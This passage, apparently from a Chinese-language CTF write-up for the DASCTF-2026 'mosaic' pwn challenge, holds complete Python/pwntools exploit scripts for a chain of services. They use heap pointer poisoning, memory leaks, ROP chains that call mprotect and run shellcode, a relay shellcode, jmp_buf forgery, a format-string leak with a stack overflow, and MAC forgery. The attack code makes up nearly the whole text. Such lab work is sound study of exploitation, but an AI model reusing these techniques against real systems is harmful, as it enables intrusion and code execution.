STACK_DELTA     = 0x120        # rbp of sub_2418 = io_ptr + 0x120

MARK = b'PWNED!!\n'
SHELLCODE = asm('''
    mov eax, 1
    mov edi, 1
    lea rsi, [rip+msg]
    mov edx, 8
    syscall
    mov eax, 60
    xor edi, edi
    syscall
msg:
    .ascii "PWNED!!\\n"
''')

def pagesolve(fd, d1=PTR_DELTA, low12=P_LOW12):
    S = low12 + d1
    t = S & 0xfff
    c = S >> 12
    r = (fd & 0xfff) ^ t
    t2 = r + c
    if t2 >= 0x1000:
        return None
    W = (fd >> 12) ^ t2
    H = 0
    for i in range(W.bit_length()+24):
        wi = (W >> i) & 1
        if i >= 12: wi ^= (H >> (i-12)) & 1
        H |= wi << i
    return (H << 12) | r

class Local:
    def __init__(self):
        self.w=wtest.W(preload=None)
        self.p=self.w.p; self.pie=self.w.pie
        self.ps=self.w.ps
    def send(self,op,data=b''):
        if isinstance(op,str): op=ord(op)
        self.ps.sendall(bytes([op])+struct.pack('>I',len(data))+data)
    def recvn(self,n,timeout=3):
        self.ps.settimeout(timeout); b=b''
        while len(b)<n:
            d=self.ps.recv(n-len(b))
            if not d: raise EOFError('eof')
            b+=d
        return b
    def status(self): return self.recvn(3)
    def close(self):
        try: self.p.kill()
        except: pass

class Remote:
    def __init__(self,host,port,timeout=5):
        self.s=socket.create_connection((host,port),timeout=timeout); self.s.settimeout(timeout)
        self.pie=None; self.p=None
    def send(self,op,data=b''):
        if isinstance(op,str): op=ord(op)
        self.s.sendall(bytes([op])+struct.pack('>I',len(data))+data)
    def recvn(self,n,timeout=5):
        self.s.settimeout(timeout); b=b''
        while len(b)<n:
            d=self.s.recv(n-len(b))
            if not d: raise EOFError('eof %r'%b)
            b+=d
        return b
    def status(self): return self.recvn(3)
    def close(self): self.s.close()

def make_png(pix, after=((b'tEXt',b'k\x00'+b'A'*765),), pal=None):
    return wtest.mkpng(list(pix), after, pal)

def status_ok(r):
    if r==b'OK\n': return True
    if len(r)>=3 and r[:3]==b'ERR':
        # consume trailing newline if present
        try:
            if r==b'ERR': pass
        except: pass
        return False
    return r

def run(host=None,port=None, verbose=True, do_qdump=False):
    if host: io=Remote(host,port)
    else: io=Local()
    log=print if verbose else (lambda *a,**k: None)
    pix=[0,1,2,3,4,5]
    # ---- stage 0: load
    io.send('L',make_png(pix)); st=io.status()
    if st!=b'OK\n': raise RuntimeError('load failed %r'%st)
    log('[*] loaded')
    # ---- stage 1: D1 then leak palette fd
    io.send('D'); st=io.status(); assert st==b'OK\n', st
    buf=b''
    for i in range(6):
        io.send('V',bytes([i])); r=io.recvn(3)
        buf+=r
    fd=struct.unpack('<Q',buf[0:8])[0]
    page=pagesolve(fd)
    log('[*] fd=%#x  page=%s'%(fd, hex(page) if page else None))
    if page is None:
        io.close(); raise RuntimeError('page solve failed (carry case); retry')
    P=(page<<12)|P_LOW12
    assert P>>12==page
    canvas=P+CANVAS_DELTA; dest=P+DEST_DELTA
    log('[*] P=%#x page=%#x canvas=%#x dest=%#x'%(P,page,canvas,dest))
    # ---- stage 2: D,E,F,D,K,E,D
    io.send('E',bytes(18)); assert io.status()==b'OK\n'
    io.send('F'); assert io.status()==b'OK\n'
    io.send('D'); assert io.status()==b'OK\n'
    io.send('K'); assert io.status()==b'OK\n'
    io.send('E',bytes(18)); assert io.status()==b'OK\n'
    io.send('D'); assert io.status()==b'OK\n'
    log('[*] state machine at 90b8=3')
    # ---- stage 3: poison P->fd to T3=canvas+0x30, E, Q
    def poison(T):
        enc=(page ^ T) & 0xffffffffffffffff
        b=enc.to_bytes(8,'little')
        for idx,seg in ((0,b[0:3]),(1,b[3:6])):
            io.send('C',bytes([idx])+seg)
            r=io.status()
            if r!=b'OK\n': raise RuntimeError('C fail %r'%r)
    T3=canvas+0x30
    poison(T3)
    io.send('E',bytes(18)); st=io.status()
    if st!=b'OK\n': raise RuntimeError('E3 failed %r'%st)
    log('[*] E3 done, dest should be %#x'%T3)
    # T: canvas+0x50 = dest (Q read base)
    payload=bytearray(768)
    struct.pack_into('<Q',payload,0x50,dest)
    io.send('T',bytes(payload)); st=io.status(); assert st==b'OK\n', st
    # Q dump
    leaks={}
    data=b''
    for off in range(0,377,8):
        io.send('Q',struct.pack('<h',off))
        r=io.recvn(8,timeout=3)
        data+=r
    log('[*] Q read %d bytes'%len(data))
    q=lambda o: struct.unpack('<Q',data[o:o+8])[0]
    io_ptr=q(0x108); pie_ptr=q(0x100); libc_leak=q(0xc8)
    log('    io_ptr=%#x read_data_fn=%#x libc_leak=%#x'%(io_ptr,pie_ptr,libc_leak))
    if do_qdump:
        for off in range(0,len(data),8):
            print('   +%03x: %#018x'%(off,struct.unpack('<Q',data[off:off+8])[0]))
    # sanity: read_data_fn should be sub_1B2E
    pie = pie_ptr - 0x1b2e
    libc = libc_leak - OFF_LIBC_LEAK
    rbp_2418 = io_ptr + STACK_DELTA
    log('[*] pie=%#x libc=%#x rbp_2418=%#x'%(pie,libc,rbp_2418))
    # ---- stage 4: prepare canvas ROP chain + shellcode, then pivot
    sc_off=0x200
    page_canvas = canvas & ~0xfff
    chain=bytearray(768)
    fake_rbp = canvas+0x100
    # at canvas+0x100: dummy rbp; chain starts at 0x108
    off=0x108
    def put(o,v): struct.pack_into('<Q',chain,o,v)
    put(0x100, 0xdeadbeef)
    put(off, libc+OFF_POP_RDI); off+=8
    put(off, page_canvas); off+=8
    put(off, libc+OFF_POP_RSI); off+=8
    put(off, 0x1000); off+=8
    put(off, libc+OFF_POP_RDX_R12); off+=8
    put(off, 7); off+=8
    put(off, 0x4141414141414141); off+=8
    put(off, libc+OFF_MPROTECT); off+=8
    put(off, canvas+sc_off); off+=8
    chain[sc_off:sc_off+len(SHELLCODE)] = SHELLCODE
    io.send('T',bytes(chain)); st=io.status(); assert st==b'OK\n', st
    log('[*] ROP chain staged')
    # ---- stage 5: U, poison P->fd to rbp_2418, E4 pivot
    io.send('U'); st=io.status()
    if st!=b'OK\n': raise RuntimeError('U failed %r'%st)
    poison(rbp_2418)
    payload=struct.pack('<Q',fake_rbp)+struct.pack('<Q',pie+PIE_LEAVE_RET)+b'\x00\x00'
    io.send('E',payload)
    log('[*] pivot sent, waiting for marker...')
    try:
        marker=io.recvn(len(MARK),timeout=3)
        if marker==MARK:
            log('[+] PWNED: worker code execution confirmed')
            io.close(); return True
        else:
            log('[!] unexpected reply %r'%marker)
    except Exception as e:
        log('[!] no marker: %r'%e)
    io.close(); return False

if __name__=='__main__':
    ok=run(do_qdump=True)
    print('RESULT',ok)
```

worker 测试的代码如下。

```python
import socket, os, subprocess, struct, time, zlib, sys
X='/home/lzl402/Desktop/ctf/DASCTF-2026/PWN-mosaic/x'
LP='/tmp/jammy/libs:'+X
BIN='/tmp/lzl4/mosaic'

def chunk(t,d):
    return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)

def mkpng(pix, after=(), pal=None, w=3,h=2):
    if pal is None: pal=bytes((i*7)&0xff for i in range(768))
    raw=b''
    for r in range(h): raw+=b'\x00'+bytes(pix[r*w:(r+1)*w])
    out=b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',struct.pack('>IIBBBBB',w,h,8,3,0,0,0))
    out+=chunk(b'PLTE',pal)
    out+=chunk(b'IDAT',zlib.compress(raw,9))
    for t,d in after: out+=chunk(t,d)
    out+=chunk(b'IEND',b'')
    return out

class W:
    def __init__(self, preload=None, lp=LP):
        self.ps,cs=socket.socketpair(); self.bs,_=socket.socketpair()
        bfd=self.bs.fileno()
        def pre(): os.dup2(bfd,3)
        env=dict(os.environ); env['LD_LIBRARY_PATH']=lp
        if preload: env['LD_PRELOAD']=preload
        self.p=subprocess.Popen([BIN],stdin=cs.fileno(),stdout=cs.fileno(),pass_fds=(bfd,),
                                preexec_fn=pre,env=env)
        cs.close(); self.bs.close(); self.ps.settimeout(3)
        self.pie=self.find_pie()
    def find_pie(self):
        for l in open(f'/proc/{self.p.pid}/maps'):
            parts=l.split()
            if parts[-1].endswith('/mosaic') and 'r--p' in parts[1] and parts[2]=='00000000':
                return int(parts[0].split('-')[0],16)
        # first mapping with offset 0
        for l in open(f'/proc/{self.p.pid}/maps'):
            parts=l.split()
            if parts[-1].endswith('/mosaic') and parts[2]=='00000000':
                return int(parts[0].split('-')[0],16)
        return None
    def mem(self):
        return open(f'/proc/{self.p.pid}/mem','rb',0)
    def rd(self,addr,n):
        with self.mem() as f:
            f.seek(addr); return f.read(n)
    def rq(self,addr):
        return struct.unpack('<Q',self.rd(addr,8))[0]
    def gl(self,off):
        return self.rq(self.pie+off)
    def send(self,op,data=b''):
        if isinstance(op,str): op=ord(op)
        self.ps.sendall(bytes([op])+struct.pack('>I',len(data))+data)
    def recvn(self,n,timeout=3):
        self.ps.settimeout(timeout); b=b''
        while len(b)<n:
            d=self.ps.recv(n-len(b))
            if not d: raise EOFError('eof %r'%b)
            b+=d
        return b
    def status(self,timeout=3):
        return self.recvn(3,timeout)
    def op(self,op,data=b'',status=True):
        self.send(op,data)
        if status and op not in (86,80,81): return self.status()
        return None
    def close(self):
        try: self.p.kill()
        except: pass

def test(preload=None, after=((b'tEXt',b'k\x00'+b'A'*765),), seq='DEFDKED', poison=True, low_guess=None):
    w=W(preload=preload)
    pix=[0,1,2,10,11,12]
    w.send('L',mkpng(pix,after)); st=w.status()
    if st!=b'OK\n': print('load fail',st); w.close(); return
    pie=w.pie
    ptr=w.gl(0x9000); q9=w.gl(0x9008); canvas=w.gl(0x7000)
    dest=w.gl(0x9010); P=w.gl(0x9028)
    print(f'pie={pie:#x} P={P:#x} ptr={ptr:#x} q9={q9:#x} canvas={canvas:#x} dest={dest:#x}')
    print(f'  offsets: q9-P={q9-P:#x} ptr-P={ptr-P:#x} canvas-P={canvas-P:#x} dest-P={dest-P:#x} P&0xfff={P&0xfff:#x}')
    q9040=[w.rq(pie+0x9040+8*i) for i in range(7)]
    print('  q9040:',[hex(x) for x in q9040])
    # sequence
    E=bytes(18)
    for c in seq:
        if c=='D': r=w.op('D')
        elif c=='E': r=w.op('E',E)
        elif c=='F': r=w.op('F')
        elif c=='K': r=w.op('K')
        else: raise ValueError(c)
        print(' ',c,'->',r)
        print('    P->fd now:',w.rd(P,8).hex(),' state: 9038=%d 90b8=%d 90bc=%d 90c0=%d 9018=%#x 9020=%#x'%(
            struct.unpack('<I',w.rd(pie+0x9038,4))[0],struct.unpack('<I',w.rd(pie+0x90b8,4))[0],
            struct.unpack('<I',w.rd(pie+0x90bc,4))[0],struct.unpack('<I',w.rd(pie+0x90c0,4))[0],
            w.rq(pie+0x9018),w.rq(pie+0x9020)))
    if poison:
        page=P>>12
        low = P&0xfff if low_guess is None else low_guess
        T=((page<<12)|low)+ (canvas-P) + 0x30
        enc = page ^ T
        print(f'  poison: page={page:#x} low={low:#x} T={T:#x} enc={enc:#x} (canvas-P delta used)')
        b=struct.pack('<Q',enc)+b'\x00'
        for i,idx in enumerate([0,1,2]):
            w.send('C',bytes([idx])+b[3*i:3*i+3]); print('  C',idx,w.status())
        w.send('E',E); print('  E3 ->',w.status())
        print('  9020 now=%#x (want %#x)'%(w.rq(pie+0x9020),T))
        # T op: set canvas+0x50 = dest
        payload=bytearray(768)
        off_destq=(dest-P)  # placeholder
        # canvas+0x50 corresponds to payload offset 0x50
        struct.pack_into('<Q',payload,0x50,dest)
        w.send('T',bytes(payload)); print('  T ->',w.status())
        # Q reads
        w.send('Q',struct.pack('<h',0))
        try:
            d=w.recvn(8,2); print('  Q[0] ->',d.hex())
            exp=w.rd(dest,8); print('   mem at dest:',exp.hex(),'match' if d==exp else 'MISMATCH')
        except Exception as e:
            print('  Q[0] failed',repr(e))
    w.close()

if __name__=='__main__':
    print('=== with preload trace3 ===')
    test(preload='/tmp/lzl4/trace3.so')
    time.sleep(0.2)
    print('=== without preload ===')
    test(preload=None)
```

worker 利用变体的代码如下。

```python
import socket, struct, time, sys, zlib
from pwn import asm, context
context.arch='amd64'
import wtest, wexploit

# worker exploit with stage-2 loader stub; returns socket pointing at broker relay
STAGE2_LEN = 0x500

def build_stub(canvas, n):
    sc = asm('''
        xor ebx, ebx
    loop:
        xor eax, eax
        xor edi, edi
        mov rsi, %d
        add rsi, rbx
        mov edx, %d
        sub edx, ebx
        syscall
        add ebx, eax
        cmp ebx, %d
        jl loop
        mov rax, %d
        jmp rax
    ''' % (canvas+0x300, n, n, canvas+0x300))
    return sc

def build_relay():
    return asm("""
        sub rsp, 0x900
        mov dword ptr [rsp], 0
        mov word ptr [rsp+4], 1
        mov dword ptr [rsp+8], 3
        mov word ptr [rsp+12], 1
    loop:
        mov eax, 7
        mov rdi, rsp
        mov esi, 2
        mov edx, -1
        syscall
        test eax, eax
        js exit
        movzx eax, word ptr [rsp+6]
        test eax, eax
        jz check3
        xor eax, eax
        xor edi, edi
        lea rsi, [rsp+0x40]
        mov edx, 0x800
        syscall
        test eax, eax
        jle exit
        mov r12d, eax
        lea r13, [rsp+0x40]
    wr0:
        mov eax, 1
        mov edi, 3
        mov rsi, r13
        mov edx, r12d
        syscall
        test eax, eax
        jle exit
        add r13, rax
        sub r12d, eax
        jg wr0
    check3:
        movzx eax, word ptr [rsp+14]
        test eax, eax
        jz loop
        xor eax, eax
        mov edi, 3
        lea rsi, [rsp+0x40]
        mov edx, 0x800
        syscall
        test eax, eax
        jle exit
        mov r12d, eax
        lea r13, [rsp+0x40]
    wr1:
        mov eax, 1
        mov edi, 1
        mov rsi, r13
        mov edx, r12d
        syscall
        test eax, eax
        jle exit
        add r13, rax
        sub r12d, eax
        jg wr1
        jmp loop
    exit:
        mov eax, 60
        xor edi, edi
        syscall
    """)

def run(host='127.0.0.1', port=10099, verbose=True):
    log=print if verbose else (lambda *a,**k: None)
    io=wexploit.Remote(host,port)
    pix=[0,1,2,3,4,5]
    io.send('L',wexploit.make_png(pix)); st=io.status()
    if st!=b'OK\n': raise RuntimeError('load %r'%st)
    io.send('D'); assert io.status()==b'OK\n'
    buf=b''
    for i in range(6):
        io.send('V',bytes([i])); buf+=io.recvn(3)
    fd=struct.unpack('<Q',buf[0:8])[0]
    page=wexploit.pagesolve(fd)
    if page is None: raise RuntimeError('carry case')
    P=(page<<12)|wexploit.P_LOW12
    canvas=P+wexploit.CANVAS_DELTA; dest=P+wexploit.DEST_DELTA
    log('[*] P=%#x canvas=%#x dest=%#x'%(P,canvas,dest))
    for op in 'EFDKE D'.replace(' ',''):
        pass
    io.send('E',bytes(18)); assert io.status()==b'OK\n'
    io.send('F'); assert io.status()==b'OK\n'
    io.send('D'); assert io.status()==b'OK\n'
    io.send('K'); assert io.status()==b'OK\n'
    io.send('E',bytes(18)); assert io.status()==b'OK\n'
    io.send('D'); assert io.status()==b'OK\n'
    def poison(T):
        enc=page ^ T
        b=enc.to_bytes(8,'little')
        for idx,seg in ((0,b[0:3]),(1,b[3:6])):
            io.send('C',bytes([idx])+seg); r=io.status()
            if r!=b'OK\n': raise RuntimeError('C %r'%r)
    poison(canvas+0x30)
    io.send('E',bytes(18)); assert io.status()==b'OK\n'
    payload=bytearray(768); struct.pack_into('<Q',payload,0x50,dest)
    io.send('T',bytes(payload)); assert io.status()==b'OK\n'
    data=b''
    for off in range(0,377,8):
        io.send('Q',struct.pack('<h',off)); data+=io.recvn(8)
    q=lambda o: struct.unpack('<Q',data[o:o+8])[0]
    io_ptr=q(0x108); pie=q(0x100)-0x1b2e; libc=q(0xc8)-wexploit.OFF_LIBC_LEAK
    rbp=io_ptr+wexploit.STACK_DELTA
    log('[*] pie=%#x libc=%#x rbp=%#x'%(pie,libc,rbp))
    # stage chain: mprotect(canvas_page,0x2000,7) -> stub
    stub_off=0x200
    chain=bytearray(768)
    def put(o,v): struct.pack_into('<Q',chain,o,v)
    put(0x100,0xdeadbeef)
    o=0x108
    put(o,libc+wexploit.OFF_POP_RDI); o+=8
    put(o,canvas & ~0xfff); o+=8
    put(o,libc+wexploit.OFF_POP_RSI); o+=8
    put(o,0x2000); o+=8
    put(o,libc+wexploit.OFF_POP_RDX_R12); o+=8
    put(o,7); o+=8
    put(o,0x4141414141414141); o+=8
    put(o,libc+wexploit.OFF_MPROTECT); o+=8
    put(o,canvas+stub_off); o+=8
    stub=build_stub(canvas, STAGE2_LEN)
    assert len(stub) < 0x100, len(stub)
    chain[stub_off:stub_off+len(stub)]=stub
    io.send('T',bytes(chain)); assert io.status()==b'OK\n'
    io.send('U'); assert io.status()==b'OK\n'
    poison(rbp)
    payload=struct.pack('<Q',canvas+0x100)+struct.pack('<Q',pie+wexploit.PIE_LEAVE_RET)+b'\x00\x00'
    io.send('E',payload)
    log('[*] pivot sent; sending stage2 relay')
    relay=build_relay()
    stage2=relay + b'\x90'*(STAGE2_LEN-len(relay))
    assert len(stage2)==STAGE2_LEN
    io.send_reserved = None
    io.s.sendall(stage2)
    # broker greeting should be relayed
    try:
        greet=io.recvn(6,timeout=4)
        log('[*] greeting from broker: %r'%greet)
    except Exception as e:
        log('[!] no greeting: %r'%e); return None
    if greet!=b'MBRK2\n':
        log('[!] unexpected greeting'); return None
    log('[+] worker->broker relay established')
    return io

if __name__=='__main__':
    io=run()
    if io:
        # test: send a broker 'A' alloc packet and see OK
        io.send('A',bytes([0,2]))  # slot0 type2 size48
        print('broker A ->', io.recvn(3,timeout=3))
        io.send('X',bytes([0]))
        print('broker X ->', io.recvn(3,timeout=3))
        io.close()
    print('DONE')
```

broker 利用的代码如下。

```python
import struct, time, sys
from pwn import asm, context
context.arch='amd64'
import wexploit2 as w2

# broker layout (relative to H0 = slot12 ptr = s)
H0_LOW12  = 0x2a0
OFF_H2    = 0x600
OFF_H3    = 0x900
OFF_H4    = 0xd00
OFF_H5    = 0x1100
ENV_OFF   = OFF_H4+0x40
# broker PIE
PIE_SETJMP_RET = 0x234f
# libc (provided 2.35)
LC_READ=0x114920; LC_WRITE=0x1149c0; LC_POP_RDI=0x2a3e5; LC_POP_RSI=0x2be51
LC_POP_RDX_R12=0x11f437; LC_MPROTECT=0x11ebf0

def st(io,t=3):
    r=io.recvn(3,timeout=t)
    if r==b'ERR': io.recvn(1,timeout=t)
    return r
def A(io,slot,typ,data=b''):
    io.send('A',bytes([slot,typ])+data); return st(io)
def X(io,slot):
    io.send('X',bytes([slot])); return st(io)
def P(io,slot,off):
    io.send('P',bytes([slot])+struct.pack('>H',off)); return io.recvn(8,timeout=3)
def W(io,slot,off,val):
    io.send('W',bytes([slot])+struct.pack('>H',off)+struct.pack('<Q',val)); return st(io)
def Z(io): io.send('Z'); return st(io)
def Y(io): io.send('Y'); return st(io)
def J(io): io.send('J')

def enc(chunk_addr, target):
    return (chunk_addr>>12) ^ target

def recover_H0(io):
    f12=struct.unpack('<Q',P(io,12,0))[0]
    f13=struct.unpack('<Q',P(io,13,0))[0]
    cands=[]
    for low in range(0,0x1000,0x10):
        H0=(f12<<12)|low
        if ((H0+OFF_H2)>>12 ^ H0)==f13: cands.append(H0)
    if len(cands)!=1: raise RuntimeError('H0 cands %r'%[hex(x) for x in cands])
    return cands[0]

def build_relay():
    return w2.build_relay()

def ror(x,n): return ((x>>n)|(x<<(64-n)))&0xffffffffffffffff
def rol(x,n): return ((x<<n)|(x>>(64-n)))&0xffffffffffffffff

def ror(x,n): return ((x>>n)|(x<<(64-n)))&0xffffffffffffffff
def rol(x,n): return ((x<<n)|(x>>(64-n)))&0xffffffffffffffff

GSET=0x4f38-0x4e00   # read@got off from slot13 base pie+0x4e00
GSETW=0x4ef8-0x4e00
GSETM=0x4f70-0x4e00

def run(host='127.0.0.1',port=10099,verbose=True, stage2_len=0x400):
    log=print if verbose else (lambda *a,**k:None)
    io=w2.run(host=host,port=port,verbose=verbose)
    if not io: return None
    assert Z(io)==b'OK\n'
    H0=recover_H0(io)
    H2=H0+OFF_H2; H4=H0+OFF_H4; H5=H0+OFF_H5
    env=H0+ENV_OFF
    log('[*] broker H0=%#x env=%#x'%(H0,env))
    # ---- Z-bin read of jmp_buf: pie + guard
    assert W(io,13,0,enc(H2,env))==b'OK\n'
    assert A(io,0,3,b'')==b'OK\n'
    assert A(io,1,3,b'')==b'OK\n'
    jb=b''.join(P(io,1,o) for o in range(0,0x48,8))
    q=[struct.unpack('<Q',jb[i:i+8])[0] for i in range(0,0x48,8)]
    pie=q[3]-0x26fe
    guard=ror(q[7],17)^(pie+0x234f)
    rsp_plain=ror(q[6],17)^guard
    log('[*] pie=%#x guard=%#x rsp_plain=%#x'%(pie,guard,rsp_plain))
    if not (0x7f0000000000 <= rsp_plain < 0x800000000000): 
        log('[!] guard sanity fail'); return None
    if ((q[4]-pie)&0xffffffffffffffff)!=0x4cc0:
        log('[!] pie crosscheck fail'); return None
    # ---- Y: slot table overwrite: slot12 base=env, slot13 base=pie+0x4e00
    assert Y(io)==b'OK\n'
    assert W(io,15,0,enc(H5,pie+0x5040))==b'OK\n'
    assert A(io,2,0,b'')==b'OK\n'
    rec=bytearray(0x1c0)
    struct.pack_into('<Q',rec,0x180,env); struct.pack_into('<Q',rec,0x188,0x1000)
    struct.pack_into('<I',rec,0x190,1); struct.pack_into('<I',rec,0x194,1); struct.pack_into('<I',rec,0x198,1)
    struct.pack_into('<Q',rec,0x1a0,pie+0x4e00); struct.pack_into('<Q',rec,0x1a8,0x1000)
    struct.pack_into('<I',rec,0x1b0,1); struct.pack_into('<I',rec,0x1b4,1); struct.pack_into('<I',rec,0x1b8,1)
    assert A(io,3,0,bytes(rec))==b'OK\n'
    def got(off): return struct.unpack('<Q',P(io,13,off))[0]
    rd=got(GSET); wr=got(GSETW); ma=got(GSETM)
    libc=rd-LC_READ
    log('[*] GOT read=%#x write=%#x malloc=%#x -> libc=%#x'%(rd,wr,ma,libc))
    if wr-libc!=LC_WRITE: log('[!] libc crosscheck write off=%#x'%(wr-libc))
    # ---- fake jmp_buf + chain at env, written via W(12,off)
    heap_page=H0 & ~0xfff
    chain_addr=env+0x100
    first=libc+LC_POP_RDI
    chain=[heap_page, libc+LC_POP_RSI, 0x2000, libc+LC_POP_RDX_R12, 7, 0x4141414141414141,
           libc+LC_MPROTECT,
           libc+LC_POP_RDI, 0, libc+LC_POP_RSI, H0+0x1000, libc+LC_POP_RDX_R12, stage2_len, 0x4242424242424242,
           libc+LC_READ, H0+0x1000]
    vals=[(0x00,0x1111111111111111),(0x08,rol(0x2222222222222222^guard,17)),
          (0x10,0x3333333333333333),(0x18,0x3333333333333333),(0x20,0x3333333333333333),(0x28,0x3333333333333333),
          (0x30,rol(chain_addr^guard,17)),(0x38,rol(first^guard,17)),(0x40,0)]
    for o,v in vals:
        r=W(io,12,o,v)
        if r!=b'OK\n': raise RuntimeError('W jmp %#x %r'%(o,r))
    for i,v in enumerate(chain):
        r=W(io,12,0x100+8*i,v)
        if r!=b'OK\n': raise RuntimeError('W chain %#x %r'%(i,r))
    log('[*] fake jmp_buf staged')
    J(io)
    log('[*] J sent; sending stage2')
    relay=build_relay()
    io.s.sendall(relay+b'\x90'*(stage2_len-len(relay)))
    time.sleep(0.3)
    return io,pie,libc

if __name__=='__main__':
    run()
```

keeper 利用的代码如下。

```python
import struct, time, sys
import broker3 as b3

M=(1<<64)-1
def sub_161E(a1):
    a1 &= M
    x=((a1>>30)^a1)&M
    x=(0xBF58476D1CE4E5B9*x)&M
    x=((x>>27)^x)&M
    v=(0x94D049BB133111EB*x)&M
    return ((v>>31)^v)&M

def ksend(io,payload):
    io.s.sendall(struct.pack('>H',len(payload))+payload)
def krecv(io,timeout=4):
    n=struct.unpack('>H',io.recvn(2,timeout))[0]
    return io.recvn(n,timeout)

def run(host='127.0.0.1',port=10099):
    r=b3.run(host=host,port=port,verbose=True)
    if not r: return None
    io,pie_b,libc=r
    # keeper HELLO
    ksend(io,b'HELLO\n')
    rep=krecv(io)
    print('[*] keeper HELLO rep=%r'%rep)
    secret=int(rep.split(b' ')[1].strip(),16)
    if secret==0: secret=0x7135B9D2468ACE01
    print('[*] keeper secret=%#x'%secret)
    # AUDIT #1
    fmt=b'%lx|%lx|%lx|%lx'
    ksend(io,b'AUDIT '+fmt)
    rep1=krecv(io)
    print('[*] audit1=%r'%rep1)
    vals=[int(x,16) for x in rep1.split(b'|')]
    secret_l, pie_fn, canary_xor, fds = vals[:4]
    pie=pie_fn-0x19b2
    canary=canary_xor ^ sub_161E(secret_l)
    print('[*] leak: secret=%#x pie=%#x canary=%#x fds=%#x'%(secret_l,pie,canary,fds))
    if secret_l!=secret: print('[!] secret mismatch')
    # AUDIT #2
    ksend(io,b'AUDIT %lx|%lx|%lx|%lx')
    rep2=krecv(io)
    print('[*] audit2=%r'%rep2)
    # COMMIT overflow -> sub_19B2
    data=b'A'*264+struct.pack('<Q',canary)+struct.pack('<Q',0xdeadbeefcafebabe)+struct.pack('<Q',pie+0x19b2)
    ksend(io,b'COMMIT '+data)
    # sub_19B2 sends framed "KEEPER\n" (u16 7 + payload)
    try:
        n=struct.unpack('>H',io.recvn(2,timeout=4))[0]
        mark=io.recvn(n,timeout=4)
        print('[*] relay marker:',mark)
    except Exception as e:
        print('[!] no KEEPER marker:',e); return None
    if mark!=b'KEEPER\n':
        print('[!] unexpected marker'); return None
    seal_stage(io,secret)
    return io,secret,pie


# ---------- seal stage appended ----------
def hash64(a1):
    a1&=M
    x=((a1>>30)^a1)&M
    x=(0xBF58476D1CE4E5B9*x)&M
    x=((x>>27)^x)&M
    v=(0x94D049BB133111EB*x)&M
    return ((v>>31)^v)&M
def rol64(x,n):
    n&=63
    return ((x<<n)|(x>>(64-n)))&M
SEAL_CONST=0x4D4F534149435332

def seal_stage(io,secret,continue_after=True):
    # marker was framed; caller should have consumed it. Here we just start seal protocol.
    def ssend(p): io.s.sendall(struct.pack('>H',len(p))+p)
    def srecv(t=4):
        n=struct.unpack('>H',io.recvn(2,t))[0]; return io.recvn(n,t)
    ssend(b'HELLO\n'); rep=srecv(); print('[*] seal HELLO=%r'%rep)
    s=int(rep.split(b' ')[1].strip(),16)
    if s==0: s=0x91A2B3C4D5E6F708
    print('[*] seal secret=%#x'%s)
    # program1: push *slot 0xFE (sub_16C4) to trace
    op1=bytes([1,0xFE,0])+b'\x00'*5+struct.pack('<Q',0)
    ssend(b'PROGRAM '+op1)
    print('    program1:',srecv())
    ssend(b'RUN\n')
    tr=srecv(); print('[*] trace=%r'%tr)
    leak=int(tr.split(b' ')[1],16)
    pie=leak-0x16c4
    print('[*] seal pie=%#x (sub_16C4=%#x)'%(pie,leak))
    fn=pie+0x16f6
    mac=hash64(s^SEAL_CONST) ^ rol64((fn^s)&M,21)
    print('[*] fn=%#x mac=%#x hash=%#x'%(fn,mac,hash64(s^SEAL_CONST)))
    op2a=bytes([2,0xFE,0])+b'\x00'*5+struct.pack('<Q',fn)
    op2b=bytes([2,0xFF,0])+b'\x00'*5+struct.pack('<Q',mac)
    op4=bytes([4,0,0])+b'\x00'*13
    ssend(b'PROGRAM '+op2a+op2b+op4)
    print('    program2:',srecv())
    ssend(b'RUN\n')
    try:
        lg=srecv(5)
        print('[*] seal gate reply=%r'%lg)
    except Exception as e:
        print('[!] no LEDGER:',e); return None
    if lg!=b'LEDGER\n':
        print('[!] unexpected'); return None
    print('[+] keeper switched to raw relay; seal raw relay to routeledger active')
    # prove raw channel: routeledger kind 0x7F state leak (LE size!)
    q0=893667148 | (0x7F<<32)
    io.s.sendall(struct.pack('<I',16)+struct.pack('<Q',q0)+struct.pack('<Q',1<<32))
    try:
        hdr=io.recvn(4,timeout=4)
        n=struct.unpack('<I',hdr)[0]
        resp=io.recvn(n,timeout=4)
        print('[+] routeledger response hdr=%r size=%d body=%s'%(hdr,n,resp.hex()))
    except Exception as e:
        print('[!] routeledger probe failed:',e)
    return s
if __name__=='__main__':
    run()
```

读写原语的代码如下。

```python
import rw, struct, time
from pwn import asm, context
context.arch='amd64'
import wexploit2 as W2
OFF_LIBC_LEAK=0x421f0; OFF_POP_RDI=0x2a3e5; OFF_POP_RSI=0x2be51
OFF_POP_RDX_R12=0x11f437; OFF_MPROTECT=0x11ebf0; PIE_LEAVE_RET=0x1a66
STAGE2_LEN=0x500
def run():
    c=rw.C(); pix=[0,1,2,3,4,5]
    c.send('L',rw.png(pix)); r=c.st()
    if r!=b'OK\n': print('L fail',r); return None
    c.send('D'); r=c.st()
    if r!=b'OK\n': print('D fail',r); return None
    buf=b''
    for i in range(6): c.send('V',bytes([i])); buf+=c.recvn(3)
    fd=struct.unpack('<Q',buf[0:8])[0]
    Ps=rw.solve_P(fd,-0x310)
    if len(Ps)!=1: print('P fail',[hex(x) for x in Ps]); return None
    P=Ps[0]; page=P>>12
    ptr=P-0x310; canvas=P-0x9c0; dest=P+0x9fc0; T3=canvas+0x30
    print('[*] P=%#x canvas=%#x dest=%#x'%(P,canvas,dest))
    for op in ('E','F','D','K','E','D'):
        c.send(op, bytes(18) if op=='E' else b''); r=c.st()
        if r!=b'OK\n': print(op,'fail',r); return None
    enc=page^T3; b=enc.to_bytes(8,'little')
    for idx,seg in ((0,b[0:3]),(1,b[3:6])):
        c.send('C',bytes([idx])+seg); r=c.st()
        if r!=b'OK\n': print('C fail',r); return None
    c.send('E',bytes(18)); r=c.st()
    if r!=b'OK\n': print('E3 fail',r); return None
    pay=bytearray(768)
    for off in range(0x48,0x2f8,8): struct.pack_into('<Q',pay,off,dest)
    c.send('T',bytes(pay)); r=c.st()
    if r!=b'OK\n': print('Tq fail',r); return None
    data=b''
    for off in range(0,377,8):
        c.send('Q',struct.pack('<h',off)); data+=c.s.recv(8)
    q=lambda o: struct.unpack('<Q',data[o:o+8])[0]
    pie=q(0x100)-0x1b2e; io_ptr=q(0x108); libc=q(0xc8)-OFF_LIBC_LEAK
    rbp=io_ptr+0x120
